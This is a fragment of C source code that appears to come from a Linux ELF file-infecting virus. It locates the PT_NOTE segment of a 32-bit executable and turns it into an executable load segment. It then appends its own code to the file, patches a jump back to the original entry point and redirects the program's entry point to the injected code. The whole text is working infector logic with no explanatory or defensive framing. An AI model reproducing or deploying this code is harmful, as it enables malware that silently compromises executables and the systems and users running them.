	/* find PT_NOTE and min addr */
	Elf32_Phdr *p;
	uint32_t base;
	phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
	for (base = 0, p = NULL, i = 0; i < ehdr->e_phnum; i++)
		if (phdr[i].p_type == PT_NOTE) {
			p = &phdr[i];
//			break;
		} else
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0)
			base = phdr[i].p_vaddr;
	if (p == NULL)
		goto _unmap;
	/* turn PT_NOTE into PT_LOAD */
	p->p_type = PT_LOAD;
	p->p_flags = PF_R|PF_X;
	p->p_align = 0x1000;
	p->p_offset = l;
	p->p_filesz = p->p_memsz = g->size;
	p->p_vaddr = p->p_paddr = base - (2*PAGE_SIZE) + (l & (PAGE_SIZE - 1));
	if (write(h, g->self, g->size) != g->size)
		goto _unmap;
	uint32_t jmp = old_entry - p->p_vaddr - 12;
	pwrite(h, &jmp, 4, l + 8, 0);
	ehdr->e_entry = p->p_vaddr;
